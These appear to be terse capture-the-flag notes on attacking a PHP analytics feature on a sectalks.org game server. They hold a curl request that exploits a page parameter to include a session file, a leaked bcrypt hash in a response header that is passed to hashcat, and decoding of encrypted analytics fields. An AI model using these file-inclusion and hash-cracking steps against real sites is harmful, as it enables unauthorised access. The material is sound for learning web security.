PHPSESSID=63087ha6b70174modmqd9g8i20


$in = file_get_contents('php://input');

{"status": "..eventStart","timestamp": 0}


$folder = '/tmp/sess/' . sha1(session_id()) . '/';
$ANALYTICS_FILE_NAME = 'analytics.json';


$fname = $_SESSION['folder'] . $data['timestamp'] . '_' . $ANALYTICS_FILE_NAME;



$fname = $_SESSION['folder'] . $data['timestamp'] . '_' . 'analytics.json'





curl -H "Cookie: PHPSESSID=63182lee6v5cccu5iia1dmeksp" -i http://game.syd.sectalks.org:8145/?page=/tmp/sess/38d2fa5bbdab3f0c3c215756a55ad2b3dce58d88/0_analytics.json

Set-Cookie: PHPSESSID=63182lee6v5cccu5iia1dmeksp; path=/
X-Analytics: eqzd/6Pe90IdevxYwcgesOK4zYK5Q7STYZMq9K1.Hnjc4qysCOaNG


$name = '/tmp/sess/38d2fa5bbdab3f0c3c215756a55ad2b3dce58d88/0_analytics.json'


{"key":"$2y$04$eqzd\/6Pe90IdevxYwcgesOK4zYK5Q7STYZMq9K1.Hnjc4qysCOaNG","data":"[\"\",\"\",\"\",\"iQ==\",\"6Mynh+VGJYP9UJui\",\"\",\"\",\"\",\"\"]"}


JSON.parse(unescape('[\"\",\"\",\"\",\"iQ==\",\"6Mynh+VGJYP9UJui\",\"\",\"\",\"\",\"\"]'))

            encrypt($data['type'], $key),
            encrypt($data['url'], $key),
            encrypt($data['ua'], $key),
            encrypt($data['timestamp'], $key),  "iQ=="
            encrypt($data['status'], $key),     "6Mynh+VGJYP9UJui"
            encrypt($data['event_data']['type'], $key),
            encrypt($data['event_data']['target'], $key),
            encrypt($data['event_data']['x'], $key),
            encrypt($data['event_data']['y'], $key)

BCrypt, 4 rounds, fixed version 2y, with a salt.

$2y$04$eqzd/6Pe90IdevxYwcgesOK4zYK5Q7STYZMq9K1.Hnjc4qysCOaNG

hashcat $2y$04$eqzd/6Pe90IdevxYwcgesOK4zYK5Q7STYZMq9K1.Hnjc4qysCOaNG





$name = '/tmp/sess/bf3b9eb1795d31477f2bd2d51ad8250a135d7370/1553027346389_analytics.json'


{"key":"$2y$06$DnQbL\/CD2zi\/ovBj0TvRZOGIUsk4V5uKFRs9ZWmUtx.Mn1nLrmQe.","data":"[\"jSyYicLhzYn4DAkaZO1I\",\"N4CVB76XKHr2EUiBZU57zm0jA8JUn6MFXOoHpwOa2CrEwA==\",\"eB2BNop5yakJCMbxR6itzT489E8nzLvid1WQjQSN9edMdNCTW4hzF+r4xB57s2y2r+ztFX6cv6\\\/sSdAVrOnlh\\\/yiET4=\",\"Vz8gowWwbshnPyz7bg==\",\"r8hXqrrHB3fLbQ==\",\"vBMa33M=\",\"eT71VXddck2WQ9bpgdiAYyrEeTLUJCE=\",\"UbF2\",\"9Tmi\"]"}
